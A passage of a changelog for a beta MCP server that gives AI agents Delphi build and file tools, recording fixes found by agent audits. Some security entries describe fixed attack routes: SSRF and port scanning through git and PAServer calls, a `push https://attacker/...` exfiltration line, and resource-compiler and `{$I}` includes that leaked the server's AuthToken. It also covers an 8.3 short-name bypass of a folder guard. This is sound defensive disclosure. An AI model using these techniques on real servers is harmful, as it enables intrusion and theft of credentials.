  `delphi_fetch` offset=0 hashed the whole file, the `/files` download hashed
  it AGAIN before streaming, and `delphi_run`/`delphi_upload` hashed too - one
  big zip was read end-to-end three times for a single download. Now hashed
  once per (path, mtime, size); the stamp invalidates the entry the moment the
  file changes, so the contract is untouched. Battery tests/test_round18.py:
  hash equals a locally computed sha256, `/files` header equals the fetch sha,
  and mutating the file yields the new hash (no staleness).

## [0.80.0-beta] - 2026-08-26

Hermes' blind rerun over v0.79 confirmed both target patterns fixed 3/3
(Linux64 build without profile; big download without base64 - nobody invented
the zip name either). One real clarity friction remained: `delphi_search`'s
"cap 500" read as a GLOBAL limit, so a model declared >500 hits unreachable.

### Changed
- `delphi_search.maxresults` now says the cap is PER PAGE, not a global limit;
  `offset` says it walks the FULL hit list (pass `nextOffset` until
  `hasMore=false` to reach every hit, however many). Hermes' two lines,
  almost verbatim. Battery pins both texts (round17 R6b).

## [0.79.0-beta] - 2026-08-26

Hermes' blind clarity evaluation: three small models solved 10 tasks from the
raw `tools/list` alone - 83.3%, with two repeated confusions. Both fixed:

### Changed
- **Build vs profile untangled** (2/3 failed to even try a Linux64 build): the
  `delphi_build.platform` description now says building a remote platform is
  LOCAL against the SDK (`delphi_paserver get-sdk`, once) and never uses
  `profile` - a PAServer profile is only for `target=Deploy`. The config
  platforms view splits the merged `needsRemoteProfile` flag into
  `needsSDKForBuild` + `needsProfileForDeploy` - one flag was answering two
  different questions.
- **Big downloads no longer bait base64** (2/3 set `maxbytes:1MB` on a 20MB
  zip, forcing inline chunks - the exact opposite of cheap): the `maxbytes`
  description now OPENS with the warning that <=1MB forces base64 and that
  large downloads should omit the parameter. And `delphi_package` returns a
  structured `nextCall {tool, arguments}` with the exact zip path - a model
  had invented the zip name when the next step was prose.

## [0.78.0-beta] - 2026-08-26

Hermes' supplement #1 and #2: programmatically distinguishable outcomes and
real JSON Schema defaults. Measured gap: a `delphi_read` on a missing path
answered only prose - `isError` absent, `structuredContent` absent - so
clients had to parse Spanish prefixes.

### Added
- **Structured outcomes on every string-answering tool** (framework layer,
  `BuildToolCallResponse`): the MCP result now carries
  `structuredContent {ok, code}` plus `isError` on failures. The human text
  stays byte-identical - the change is additive. Codes: `DENIED` (policy:
  jail, guard, ownership, read-only), `NOT_FOUND` (the named thing is not
  there), `INVALID_PARAM` (the call was wrong), `INTERNAL` (the server broke -
  report it). The jail's anti-probing property survives: outside-the-jail
  refusals use one fixed text whether the target exists or not, so both map
  to DENIED (verified by battery).
- **`SchemaDefault` attribute** in the schema generator: optional parameters
  with a measured default now emit a typed JSON Schema `default` (string,
  integer/number, boolean) instead of prose only. Annotated where it matters:
  `delphi_build` (platform Win32, config Debug, target Build), `delphi_test`
  (platform Win64, config Debug), `delphi_search` (maxresults 100, offset 0),
  `delphi_config` (command view, section summary).
- Battery tests/test_round17.py (8 checks), including the anti-probing
  equality check outside the jail.

## [0.77.0-beta] - 2026-08-26

Hermes' release audit P1.5: the two measured output walls. `delphi_config view`
answered 11.7k chars and `delphi_symbols` 37.5k for a 912-line unit - a small
model drowned before doing anything with either.

### Changed
- **`delphi_config view` defaults to a summary**: framework, configurations,
  enabled platforms, and counts of search paths / deploy files / units. The new
  `section=platforms|searchpaths|deploy|units` parameter brings each detail on
  demand; `section=all` is the old everything-at-once view. The `.dpr`-only
  view (small) is unchanged.
- **`delphi_symbols` on a file compacts big trees**: above 6k chars of full
  tree the answer is the skeleton - each section with its members as one-line
  labels (`function X(...) @line`, containers with `+N dentro`), a total, and
  a note saying how to get more. `mode=full` keeps the complete tree with
  ranges; `mode=summary` forces the skeleton; small trees keep answering full
  with nothing asked. New `filter=` finds symbols by name inside the tree
  (kind, 0-based line, container) without carrying the tree at all. The folder
  digest is untouched.
- Batteries that consumed the old full view now ask for their section
  explicitly (test_v012, test_project_units) - which also exercises the new
  parameter. New battery tests/test_round16.py (15 checks) covers both tools.

## [0.76.0-beta] - 2026-08-26

Hermes' release-readiness audit (runtime measurements over GalateaFMX), P0 items
plus the search wall from the supplement.

### Fixed
- **Builds are now serialized server-wide** (P0.1). Indy serves each request on
  its own thread, and `delphi_build`/`delphi_test`/deploy all enter MSBuild:
  two agents building at once collided DCUs, outputs and the `.deployproj`.
  Now one msbuild runs at a time (global queue in `RunMsBuild`, the safe shape);
  a call that waited 500ms+ reports `queuedMs` + `queuedNote`, so queue time is
  never mistaken for compiler time. Battery: two concurrent builds both succeed,
  exactly one waited (tests/test_round15.py E2).
- **`TLspSession.Instance` is thread-safe** (P0.3). Two FIRST concurrent LSP
  calls could both see nil and build two sessions - two sets of LSP clients, one
  leaked. Lock-free publish with `TInterlocked.CompareExchange`: the loser frees
  its candidate.
- Python 3.13 `SyntaxWarning`s in two test batteries (invalid `\`-escapes);
  `compileall tests/` is clean again.

### Added
- **`delphi_search` pagination** (supplement #3): new `offset` parameter plus
  `hasMore`/`nextOffset` in the result. A truncated search was a wall - the next
  page was unreachable no matter what the caller did. Pages never overlap and
  walking `nextOffset` visits every hit exactly once (tests/test_round15.py E1).

### Docs
- README's Tests section described 8 batteries/468 checks from months ago; now
  points at `tests/run_all.py` and the real scale. ROADMAP: phase-0 decisions
  and the build-queue part of the Workspace Manager marked done; what remains
  of it (LRU/idle shutdown, hang respawn) stays open, credited to the audit.

## [0.75.0-beta] - 2026-08-25

### Added
- **Optional per-agent write confinement** (`AgentConfinement`, OFF by default).
  sweep10 confirmed the jail is per-ROOT, not per-agent: any agent could write
  into another's folder in a shared workspace. With confinement on, an identified
  agent may WRITE only inside `<root>\<its-name>\...` or a folder the operator
  marked shared (`SharedFolders=`); reading the whole tree stays open, and a
  caller with no identity (stdio, the operator's own console) is unconfined - the
  same trust rule the recoverable trash already uses. Enforced at the single
  write gate (`PathDenied`), so every write tool honours it at once; reads that
  trip only confinement are allowed through. Off by default changes nothing.

## [0.74.0-beta] - 2026-08-25

### Fixed
- **Deleting a LOCKED folder gutted it into the trash while reporting "half
  done" - a data-loss trap.** `TDirectory.Move` falls back to a recursive
  copy+delete of its own accord when the atomic rename fails, so a folder with a
  running `.exe` or a git process inside had its content moved into a recoverable
  copy and the original emptied, under a message that said the original "could
  not be removed" - and every retry made another full copy. A human who purged
  those "leftover" copies deleted real code. Now the trash move uses the raw
  Windows `MoveFile` (never copies): same-volume it renames atomically, and on a
  locked tree it fails with **everything untouched** and says so plainly. Found
  by a probe agent (sweep10) sweeping the remote dev cycle.

## [0.73.0-beta] - 2026-08-25

First live dogfooding by a frontier agent (Hermes / GPT-5.6 Sol) on a real FMX
release, plus a second layout adversarial pass. Both landed real bugs.

### Fixed
- **`delphi_completion` after a dot returned the whole global scope.** Member
  completion happens in the column PAST the dot ("after `Foo.`" is dot-col + 1),
  and an agent that cannot see the cursor lands a column short and gets 5157
  globals with no hint. When `trigger='.'`, the position now snaps to just past
  the nearest dot and a `positionNote` explains it - Hermes' exact failing call
  (`ServicioEventos.` at char 18) now returns the four interface members.
  Results are also ordered by the LSP `sortText`, so the top 50 are the relevant
  candidates, not a raw-order slice.
- **`layout` false-positived every tabbed form.** A `TPageControl`'s `TTabSheet`
  children are all `alClient` and "overlap 100%" BY DESIGN (one page shown at a
  time); so do the children of a `TFlowPanel`/`TRelativePanel` (arranged at
  runtime, not by `Left`/`Top`) and `alCustom` controls. All of these are now
  recognised as parent-managed and left unjudged, alongside the `TGridPanel`
  already handled.
- **`AlignWithMargins`/`Margins` are modelled**, so the resolved `boxes` are
  correct to the pixel for margined layouts (they were off by the margin width -
  exactly the "place the next control" case).
- **Inherited controls** whose ancestor lives in another `.dfm` are no longer
  reported as `alNone`, height 0, "missing Height"; they are marked
  `align: "inherited?"` and left out of the geometry checks, since their real
  size comes from a form this pass does not merge.
- `sizeNotWritten` now asks only for the dimension the align actually needs (an
  `alTop` control takes its width from the parent, so no more "missing Width").

## [0.72.0-beta] - 2026-08-25

`delphi_designer command=layout`, one day old, taken apart by a probe agent that
built forms the way the IDE writes them. Seven false positives on CORRECT forms
(the most expensive kind - an agent learns to ignore a tool that cries wolf),
three real bugs it missed, and six smaller defects. Rewritten around the VCL's
actual layout semantics.

### Fixed
- **`alClient` is resolved LAST and does NOT shrink the remaining rectangle.**
  The first was a false positive (an `alClient` grid declared before an
  `alBottom` panel "overlapped" it); the second was a missed bug (two visible
  `alClient` siblings get the WHOLE rectangle each and cover each other 100%,
  exactly as the IDE writes them). Both now correct.
- **`Visible = False` controls are skipped**, as the VCL neither lays out nor
  draws them. Wizard-style stacks (N `alClient` panels, one shown) and
  swap-in-place edit/combo pairs no longer read as overlaps.
- **Class default `Align` is applied** when the `.dfm` omits it: `TStatusBar`
  is `alBottom`, `TToolBar` `alTop`, `TSplitter` `alLeft`, `TTabSheet`
  `alClient`. The status-bar/tool-bar/memo trio - the exact form an agent writes
  blind - is three bands now, not a pile.
- **`TScrollBox`** content is allowed to exceed the box (that is what it is for);
  **`TGridPanel`** children (`alClient` per cell) are left alone; a
  **`TBevel`/`TShape`/`TImage`** frame is decoration and does not "cover".
- **A `TTabSheet`/`TCategoryPanel` and its contents are checked.** They write no
  `Width`/`Height` (they fill the parent), so the old code skipped them as
  non-visual and hid everything inside; a container is visual if it has children
  or a non-`alNone` class default.
- **Overflow no longer cascades.** A band that does not fit is clipped once, with
  the visible pixels named; sizes are clamped at zero, so one overflow stops
  producing a negative-size error at every level below it.
- **`.fmx` is refused, not answered wrongly.** Its geometry model (`Size.Width`,
  `Position.X`) is different; layout is VCL/`.dfm` only, and says so instead of
  returning a false `ok`.
- A form with only `Width`/`Height` (Delphi 5/7 `.dfm`, no `ClientWidth`) is
  measured against an estimated client area with the estimate declared, instead
  of taking the whole window as client. A **truncated `.dfm`** is flagged.
  `sizeNotWritten` names the missing dimension, and only the one the align needs.

### Added
- **`boxes`** in the layout result: the resolved rectangle of every control, in
  FORM coordinates, whether or not the form has a problem. This is the "where
  things actually end up" the tool's name promises - and what lets an agent
  place the next control without seeing the screen (the muro the probe named).

## [0.71.0-beta] - 2026-08-25

Round 9 security re-audit (agent sec9). The round-8 trash fixes were real but
bypassable, and the ownership check could be turned into a denial-of-cleanup.

### Fixed
- **The trash guard was defeated by an NTFS 8.3 short name.** The guards matched
  the literal segment `\__delphi-patch\`, but `__DELP~1` resolves to the same
  folder and slipped straight past - reopening writes into another agent's
  recoverable copies through both `delphi_textedit` and `delphi_upload`, and
  moving files INTO the trash. Every segment guard now canonicalises the path
  first (`GetLongPathName` over the longest existing prefix). The jail itself is
  deliberately left on the non-expanded path, because a workspace root can
  legitimately BE a short name.
- **A planted `.by` made a folder unpurgeable and showed invented owners.** Any
  file renamed to `<x>.by` had its content read as an owner name. A marker now
  owns only the copy sitting next to it; an orphan or planted `.by` marks
  nothing. (A bug in the same fix briefly let anyone purge another agent's live
  marker - owner was read one `.by` too deep; corrected.)
- **An agent could not leave the trash clean.** It could not purge its own or an
  orphaned `.by`, so restores left a litter only the operator could sweep. An
  orphan or own marker is now purgeable, and restoring a copy with `delphi_move`
  takes its marker with it.

Every fix ships with the counter-test proving it did not over-tighten: the
literal-path guards, the jail, purging another agent's live copy/marker (still
refused), and the normal delete/restore/purge flow all still behave.

## [0.70.0-beta] - 2026-08-25

### Added
- **`delphi_designer command=layout` - WHERE things actually end up.** An agent
  building a form has the numbers (it wrote them) but not the arithmetic that
  turns `Left`/`Top`/`Width`/`Height` plus `Align` into a screen. `check-binding`
  proves a form BINDS; this proves it can be SEEN. It resolves `Align` the way
  the VCL does - each aligned child eats its band off the parent's remaining
  client rectangle, in `.dfm` order, and `alClient` takes what is left - and
  then reports:
  - **controls that overlap** (one hides the other), only between free
    (`alNone`) siblings, since aligned ones are placed by construction;
  - **controls with a side of zero** - present, loadable, invisible;
  - **controls that fall outside their container**, at any nesting depth, with
    the container's real size next to the control's rectangle;
  - **aligned children that ran out of room**, and a **second `alClient`**,
    which receives nothing;
  - sizes the `.dfm` never wrote, declared unknown rather than guessed at.
  Non-visual components (a `TTimer`, a `TPopupMenu`: `Left`/`Top` only, no size)
  carry no geometry and are not judged. Verified against four real forms with
  zero false positives, and against a form broken four ways on purpose.
  It says how it measures: a container's client area is taken as its
  `Width`/`Height` (bevels and borders shave a few pixels) and `Anchors`
  describes what happens on RESIZE, which is not what this measures.

## [0.69.0-beta] - 2026-08-25

Round 8 of adversarial agent probing: three agents attacked the live server at
once - one on security, one on VCL forms, one comparing the README with reality.
Everything below is something they broke.

### Fixed
- **Purging a trash FOLDER destroyed every agent's copies inside it.** The
  ownership check asked for `<folder>.by`, which never exists, read that as
  "nobody's" and deleted the tree. Two agents hit it independently; one lost
  another agent's entire backup folder. A folder is now refused if it holds a
  single copy belonging to somebody else, and it names them.
- **The trash was writable, so the guard could be walked around.** `delphi_edit`
  refused it and sent non-Delphi text to `delphi_textedit`, which had never
  heard of the rule: an agent rewrote another agent's recoverable copy, and
  edited a `.by` owner marker from `bob` to its own name to purge what was not
  its own. Writes into `__delphi-patch`, `__history`, `__recovery` and any `.by`
  are now refused at one shared gate. Reading and restoring still work.
- **`delphi_upload` replaced a live text `.dfm` with a binary one.** It was the
  only writer with no designer rule; the file it wrote could not be read back by
  any tool here, and the build died in RLINK32.
- **`delphi_test` called a red suite "ha terminado bien".** A runner whose output
  this server cannot count returned exit code 1, and the zero-tests branch
  overwrote the verdict the exit code had already given. Not knowing how to
  count is our problem; the exit code is the runner saying it failed, and it wins.
- **`check-binding` shipped yesterday with a jail escape and four false answers.**
  `unit` never went through the read jail (a file oracle over the whole machine,
  and it parsed what it found). It read the whole `.pas` instead of the form's
  own class, so a second class vouched for components that did not exist. It
  accepted a handler declared `private`/`public` - the exact runtime failure it
  promises to catch, since the form loader only sees PUBLISHED methods. It could
  not read `A, B: TButton;` or a qualified type, reported the children of an
  inline frame as missing, and called every inherited member of a form whose
  ancestor lives in another unit missing. Now it follows the ancestry as far as
  the unit goes and says what it cannot see instead of inventing it, and it also
  catches duplicate component names (`EComponentError` at load) and an event
  left with no value (an invalid `.dfm` the linker rejects without naming a line).
- **`firstError` vanished on single-error builds**, documented as unconditional.
- **`delphi_help` pointed at two tools that do not exist** (`delphi_paclient`,
  `delphi_remoterun`); the real one is `delphi_paserver`.
- A `.dfm` guard written as `'\'` matched nothing: **Pascal has no string
  escapes**, so that is two literal backslashes and no path contains them.

### Added
- **`tests/run_all.py`** - runs the 28 batteries against a CLEAN copy of the
  server. The server reads a `settings.ini` next to its executable, and a dev
  machine has one there, so five batteries were failing for reasons that had
  nothing to do with the code. 1011 checks.
- **README: the seven tools that had no row** (`delphi_help`, `delphi_test`,
  `delphi_delete`, `delphi_move`, `delphi_package`, `delphi_styles`,
  `delphi_messages`), and `delphi_help` promoted to the first row - it is the
  map, and it was mentioned once in the whole document.
- **`check-binding` in the `command` schema.** It was documented in the README
  and missing from the enum agents actually read, so nobody would ever call it.

### Changed
- **The four-questions section was re-checked claim by claim and corrected.**
  It said errors carry a column field (they do not), named `delphi_projects
  add-searchpath` (it is `delphi_config`, and paths are per PLATFORM, not per
  configuration), and promised a `compilesAgainst` that does not exist. What is
  missing is now stated: no form rendering, no structural `.dfm` editing,
  inactive `{$IFDEF}` counted as live code, no check of component class against
  field type or of handler signatures, and no way to convert a binary designer
  to text from here.

## [0.68.0-beta] - 2026-08-25

### Added
- **Per-session agent identity.** The handshake's `clientInfo.name` is bound to
  the `Mcp-Session-Id` the server issues and the client echoes on every request,
  so the name is fixed at connect time and cannot be re-declared per call. Two
  phases: the shared Bearer token is the door, the session id is who you are.
  Not authentication - enough to keep agents in different projects off each
  other's work, and to stop casual impersonation.
- **Trash ownership.** Anything moved to the recoverable trash records who
  trashed it; `purge=true` refuses someone else's copy and names the owner. A
  caller with no identity (stdio, the operator's own console) is still trusted
  with everything, and an unowned item is fair game.
- **`delphi_designer check-binding`** - the question the compiler never asks:
  does the `.dfm` agree with its class? Reports components with no published
  field, events naming methods that are not declared, and published fields with
  no component. Text-based on purpose: it has to work on a form that does not
  compile yet, which is exactly when it is needed. Only the published area of
  the class counts (private fields are the programmer's own - counting them gave
  two false positives on the first real form it ran against).
- **`F2039` hint** on a locked output naming the likely cause (the app still
  running, the IDE holding the target, an antivirus). The server does not kill
  processes on the host: a human may be at that IDE.
- **README: "The four questions every Delphi developer asks first"** - `.dfm`
  corruption, MSBuild noise, file locks and package managers, each with what is
  measured and what is deliberately absent. Written because a reviewer reading
  the repo proposed four improvements of which three already existed, buried in
  a 41-row tool table: undocumented is indistinguishable from missing.

### Fixed
- **`delphi_designer` treated real binary `.dfm`/`.fmx` as text.** It only
  recognised a raw `TPF0` stream, but the on-disk shape wraps that stream in a
  resource header starting `$FF` - the commonest binary form went straight past
  the guard and `lint`, `tree`, `get` and `check-binding` answered about
  garbage. The write layer had always refused both shapes; the read side now
  matches it. Lint answering about garbage is worse than lint refusing.
- **`check-binding` reported "cannot find the unit" for a binary form**, sending
  the caller hunting for a file that was never the problem. The binary check now
  comes first.

## [0.67.0-beta] - 2026-08-25

The last wall the field named: nothing here deleted for real.

### Added
- **`delphi_delete purge=true`** - the one way something leaves for good, and
  it only reaches INSIDE the trash. Five agents in one day left 112 MB of
  copies none of them could remove through MCP, and during a security audit a
  `.res` that should never have existed survived its own delete - still
  inside the jail, still downloadable. The rule that a live file always goes
  to the recoverable copy first does not bend (that is what makes every other
  write safe): purge refuses on anything live, and refuses on the trash root
  as a whole, because other people's copies are in there too.


## [0.66.0-beta] - 2026-08-25

Field round 12. An auditor put the finding of the previous round in one
sentence: **the fix closed one call site, but the problem is systemic** -
brcc32 and the compiler both receive paths and open files with the server's
own access, and neither asks the jail. Both remaining doors are shut here.

### Security
- **The `.rc` guard did not follow `#include`.** A manifest whose own lines
  are all legal, including a second file whose lines are not, compiled - and
  the server's `settings.ini`, **with the AuthToken in it**, came back inside
  a downloadable `.res`. The guard now walks the whole include closure
  (cycle-safe, depth-capped) and names the file the offending path came from.
- **`{$I}` in any source made the compiler read outside the jail**, and its
  error messages quote what it found, identifier by identifier - measured
  independently here before the audit arrived, on a text file whose words
  came back as `Undeclared identifier: 'esto'`. Every `{$I}`, `{$INCLUDE}`,
  `{$R}`, `{$RESOURCE}`, `{$L}` and `{$LINK}` in the project's sources is
  resolved and checked before msbuild starts. The refusal is a refusal, not
  an `Error executing tool:` - which this server's own rules define as an
  internal failure worth reporting as a bug.
- **`delphi_symbols` was an existence oracle for the whole disk**: a Delphi
  file outside the jail that EXISTS answered "outside the workspaces", one
  that does not answered "does not exist". Same refusal either way now, like
  `delphi_read` has always done.

### Added - what the refactor asked for
- **A multi-line anchor inside `edits`.** The one-line rule protects a lone
  edit, where a long anchor is a long chance to mistype; inside a batch,
  replacing a method body you just read, it was pure bookkeeping - six lines
  meant six entries to line up by hand. A block is matched whole and exactly,
  which is its own protection.
- **`occurrence` instead of counting lines.** Line numbers MOVE inside a
  batch as earlier entries add or remove lines, so an `atline` taken from the
  original file drifts - one agent had to work out a running +13 offset by
  hand, which is exactly the bookkeeping the batch was meant to remove.
  Which of the N identical lines you meant does not drift.
- `delphi_symbols`' folder digest now gives what it was asked for: whole
  declarations (a `;` inside a parameter list is a separator, not an end, so
  signatures were being cut before their return type), the `const` and
  `resourcestring` an interface offers, private fields, which class each
  member belongs to, and the line it is on. A trailing separator is a folder.
- `delphi_help`'s map says how to get a tool's PARAMETERS, which is how
  somebody spent three calls discovering that `delphi_create` takes `content`.
- Aliases for the names that cost a call every time: `from`/`to` on
  `delphi_read`, `path` on `delphi_search`, `body`/`text` on `delphi_report`.
- `delphi_test` given a project NAME says so, instead of answering with the
  jail message that is true of any relative name and explains nothing.

### Fixed
- A character an old scripted edit ate back in v0.45: `'ackup'` had been
  living as `'ackup'` in the build scanner's skip list.

### Known, and the operator's call
- Nothing in MCP deletes for real: `delphi_delete` is a recoverable trash and
  `delphi_upload` backs up before overwriting. During this round that meant a
  `.res` carrying the token survived a delete, inside the jail and
  downloadable. It has been purged by hand. A hard-delete path (or a trash
  the tools cannot read back) is the open question this leaves.


## [0.65.0-beta] - 2026-08-25

The two walls the field kept naming. Neither was a bug: both were the shape
of the tools making the safe road the expensive one.

### Added
- **`delphi_edit edits=[...]`** - several anchored edits on ONE file, in one
  call, all or nothing. Stitching a new unit into an existing class took
  thirteen separate calls (uses, a field, two declarations, a property,
  constructor, destructor, four bodies), every anchor resolving first time:
  the anchor contract was never the problem, the granularity was. A changeset
  gives atomicity but costs `begin` + N stages + `preview` + `commit`, so for
  a single file the choice was "thirteen fast calls with no net" or "sixteen
  with one". Now it is one call WITH the net: the file is snapshotted first
  and restored byte for byte if any edit fails, and the answer says which one
  failed and why. Each entry keeps exactly the single-edit contract.
- **`delphi_symbols path=<folder>`** - what every unit in a folder OFFERS,
  from its interface section: types, classes, members, properties and its
  `uses`, no bodies. Orienting yourself in code somebody else wrote cost one
  `delphi_read` per file, and 90% of what you need is in the interfaces
  (measured: 12 calls to get the picture of a 700-line project, 7 of them
  reads). One call now, ~4.5 KB for four units.

### Fixed
- `delphi_symbols`' folder digest missed everything a class declares: a
  regex written with `` reached the source as a backspace character, so
  every word-boundary pattern silently matched nothing. Same trap that bit
  the drive mask two rounds ago - worth remembering that a `` in a
  generated Pascal literal is not a word boundary unless you make it one.


## [0.64.0-beta] - 2026-08-25

Field round 11: an audit of the surfaces nobody had attacked yet, and a
MAINTENANCE job on code another agent had written. New battery
`tests/test_round11.py` (13 checks).

### Security - the same mistake in two places
Both findings are a tool doing work on the caller's behalf without asking the
jail first.

- **A `.rc` turned the resource compiler into an arbitrary file reader.**
  `delphi_styles command=build` handed the manifest to brcc32, which opens
  whatever it names with the SERVER's own access and embeds it in the `.res` -
  which `delphi_fetch` then hands over. An auditor read `C:\Windows\win.ini`
  that way and measured that **the server's own `settings.ini`, where the
  AuthToken lives, went in too**. Every path a `.rc` mentions is now checked
  against the read jail before brcc32 sees it. `view`/`get` had always been
  jailed; `build` was the hole.
- **`add-profile` bypassed the host allowlist that 0.63 had just added.**
  Writing a connection profile to any host:port and then "testing the
  connection" to it was a port scanner with a reliable open/closed oracle -
  measured on this very server while it was being audited. Registering a
  profile IS declaring where this machine may connect, so it goes through the
  same gate.
- **`remove-profile`** exists now: profiles live outside the workspace, so an
  agent that created one for a test had no way to clean up after itself.

### Fixed - the rename lied
- **`delphi_rename_symbol` answered `applicable:true` for a rename that broke
  the build.** A test project next door, with `..\Inventario` in its search
  path, holds real references - and the engine, resolving them against the
  wrong project's settings, filed them as "homonyms" and counted them in a
  number nobody could act on. Three things changed: the scan now reaches the
  projects whose search path points at the symbol's folder; a lookalike that
  resolves to ANOTHER unit is a **blocker** with its location listed
  (`lookalikes`); and the answer says where it looked (`scope`). The word
  "applicable" means "the evidence is complete", so a partial scan may not
  say it.
- The definition change carries an `anchor` like every other change - it was
  the one occurrence still forcing a trip back to `delphi_read`.

### Fixed - frictions from the maintenance job
- `delphi_edit` drops ONE trailing line break from `new`: a block read from a
  file (the recommended way to send code) always carries one, and it landed
  as a blank line inside the code. Two or more are kept.
- `delphi_edit` warns when what you insert repeats the line above or below -
  almost always the anchor sent twice, invisible, and it cost an agent eight
  calls to find.
- `delphi_build` says which platform it used when nobody chose (it defaults to
  Win32 while `delphi_test` runs Win64: two different binaries).
- A form created in a CONSOLE project is announced instead of going in
  silently: it compiles and nobody will ever see it.
- `delphi_test` with only `project` means `run` (it fell to `discover` and
  then complained about a parameter that only `discover` has).
- `delphi_config` accepts `unit=` as well as `path=` for add-unit/remove-unit.
- `delphi_projects` says which folders each project **compiles against** -
  the search paths are how a test project sees the code it exercises, and
  finding that out took a separate call.


## [0.63.0-beta] - 2026-08-25

Field round 10. The fourth wave of agents went at 0.62 through nothing but
MCP. New battery `tests/test_round10.py` (35 checks).

### The one that matters
- **A red test suite came back green.** The counter demanded EXACTLY
  uppercase `PASS`/`OK`/`FAIL`/`ERROR` while the documentation promised "the
  first word decides", so a runner printing `Fail: email invalido` or
  `FAILED seis` scored nothing at all: two real failures, `result: "pass"`.
  Counting is case-insensitive now, `PASSED`/`FAILED` count, and any line
  that LOOKS like a result but did not count is declared in
  `linesNotCounted`. This is the only time this server has called broken code
  working, and it is the reason the whole exercise is worth doing.

### Security
- **The SSRF that `GitRemotes` closed was still open through
  `delphi_paserver test-connection`**: `host=127.0.0.1 port=3131` made the
  server dial its own MCP port, and any host:port answered reachable /
  refused / timed out - a port scanner run from inside this machine's
  network, with no execution permission needed. Hosts now come from the IDE's
  own connection profiles plus **`[Security] RemoteHosts`**.
- An IPv6 git URL parsed its host as `[`. Fail-safe, but now correct.
- `delphi_test` runs a compiled binary, and Windows low integrity confines
  writes, not reads: a test can read anything the token can read and print
  it. That is inherent to running code; `AllowTests` now says so plainly
  instead of promising a confinement it does not provide.

### Fixed - crashes and false reports
- **`commit` crashed with an access violation** on the "a file changed since
  the preview" path: a local freed in the `finally` was only created further
  down, so freeing it depended on what the stack happened to hold. Introduced
  in 0.61 by the commit-audit feature; the data was never at risk, but a
  crash is a crash.
- **`delphi_create kind=unit name=System.SysUtils` hijacked the RTL.** The
  guard only looked at bare names, and its own refusal recommended "use a
  namespace with a dot" - which was the hole. An empty `System.SysUtils.pas`
  next to the project makes `Exception` stop existing.
- **Deleting a folder left an empty shell that no retry could remove**, while
  each retry copied the whole tree to the trash again (five copies of the
  same folder). The cause was git's read-only object files; the message also
  said "the original could not be taken away" when in fact everything had
  already moved out.
- `commit` reported the file's whole delta next to EVERY operation that
  touched it, and put a `+79` next to a `delete`. One line per file now.

### Fixed - answers that were not true
- Naming a build folder (`Win64`) as `root` in `delphi_list` still hid
  everything, while the note said to do exactly that; only the deepest folder
  worked.
- Without `pattern`, `delphi_list` shows only Delphi files - a filter nobody
  mentioned, which reads as "there is nothing else here".
- The timeout note said "the numbers come back at zero" while the same answer
  carried real counts (following its own advice about `Flush` gets you
  there).
- `nobuild=true` with no binary said "not found after compiling" - it had not
  compiled anything, as asked. It now also warns when the source is NEWER
  than the binary it just ran.
- A test `platform` nobody recognises ran Win64 in silence.
- `hover` and `definition` on a non-Delphi file answered a canned hint and a
  bare `null`; a file that is not there came back as `Error executing tool:`,
  which this server's own rules define as an internal failure worth
  reporting. Both are refusals now, like `delphi_symbols` already was.
- An unknown parameter was also dressed as an internal failure.
- The `changeset` kind refusal forgot `delete-line`, `delphi_create`'s
  project-kind refusal listed values that do not work (`console` for
  `project-console`), and `delphi_help` claimed a tool count instead of
  counting.

### Added
- `delphi_rename_symbol` gives an `anchor` (the line WITH its indentation,
  ready to paste into an edit) and a `character` for each change: the trimmed
  `text` was useless as an anchor, and two occurrences on one line came back
  as two identical entries.
- `changeset preview` says which line each anchor resolved to (`atline`) -
  it was the only one of the three line-numbering tools that never showed its
  own.
- `changeset kind=create` normalises line endings like `delphi_create`, so
  one project does not end up with both conventions.
- `delphi_help command=tool` resolves a one-letter typo when exactly one name
  is closest, instead of handing back a list.
- A malformed `sha256` is refused as a bad parameter instead of quarantining
  a file that was uploaded perfectly.
- A refused `clone` no longer leaves its destination folder behind, and
  git's own hints (`--no-ff`, `rebase`, "specify the URL") get a line saying
  this tool refuses exactly those.
- `delphi_projects` with a `name` that matches nothing says how many there
  are, instead of a bare `{"total":0}`.
- The mailbox says plainly what it is: a shared noticeboard where anyone
  holding the token can read - and consume - any box. Nothing secret goes
  through it.


## [0.62.0-beta] - 2026-08-25

Field round 9. Three more agents worked the 0.60 server through nothing but
MCP - a security auditor, a contract prober, and one doing a real programming
job (which it finished: 78 checks green). Forty more findings. New battery
`tests/test_round9.py` (34 checks).

### Security
- **`delphi_git` would open a connection to any URL an agent named.** Measured:
  `fetch http://127.0.0.1:3131/mcp` made the SERVER reach that address (SSRF
  into its own network - localhost, internal services, metadata endpoints),
  and `push https://attacker/... HEAD:main` would have walked the jail's
  contents out. An explicit URL now has to match **`[Security] GitRemotes`**,
  a list of hosts the operator wrote down; empty (the default) refuses every
  explicit URL. Remotes the operator configured in a repository keep working
  by name (`push origin main`): where this machine may talk to is not the
  agent's decision.
- **`git merge` could be handed options, which broke the one thing it
  promised.** It ran `merge --ff-only <args>`, so `--no-ff <branch>` won and
  left the repository in MERGING with conflict markers and no way out through
  this tool. A branch name, or `--abort`. Nothing else.
- **A changeset id is now a capability.** Nothing bound a batch to whoever
  opened it and `status` printed every open id, so anyone holding the token
  could commit or roll back somebody else's half-built transaction. Ids carry
  a random tail; `status` shows only the part before it.
- **Masking was a C/D allowlist.** `E:\secret\x.inc`, `z:\...` and UNC paths
  travelled untouched. Any drive letter is masked now (unserved ones as
  `srvx:`) and a UNC host never leaves. No real leak existed on this machine -
  only C: and D: are real and both were mapped - but a root on another drive
  would have.

### Fixed - data loss and false success
- **`delphi_delete` could report `BORRADO` for a folder that was still
  there.** It says what actually happened now, and the copy is made either way.
- **An upload `offset` that landed INSIDE the file truncated the tail with no
  copy taken** (a 14-byte file resumed at offset 5 came back 8 bytes long).
  Resuming means continuing at the end: refused, with the right offset named.
- **A second quarantined upload overwrote the first** without going through
  the trash - the only write path that did not.
- **`delphi_changeset preview` trusted the stage.** Unstage the `delete` of X
  and the `create` of X behind it becomes a create over a file that exists;
  preview still said "clean". It re-validates the whole plan now.
- **A `.dproj` staged happily and blew up at commit**, taking the batch's
  good operations down with it. Refused at stage, pointing at `delphi_config`.

### Fixed - answers that were not true
- **A test killed by the timeout was indistinguishable from one that fails
  instantly** (same exitCode 1, same empty output, everything at zero).
  `result: "timeout"`, `timedOut: true`, and an explanation of why the output
  is missing: a console program's stdout is buffered, so what it printed
  before the kill never reached the pipe.
- **A suite where nothing could be counted answered `pass`** - "it compiles"
  reported as "it works". That is `no-tests` now, and `discover` documents the
  literal `PASS`/`FAIL` line format that gets counted.
- **`delphi_test` never said which platform it ran** (Win64, while
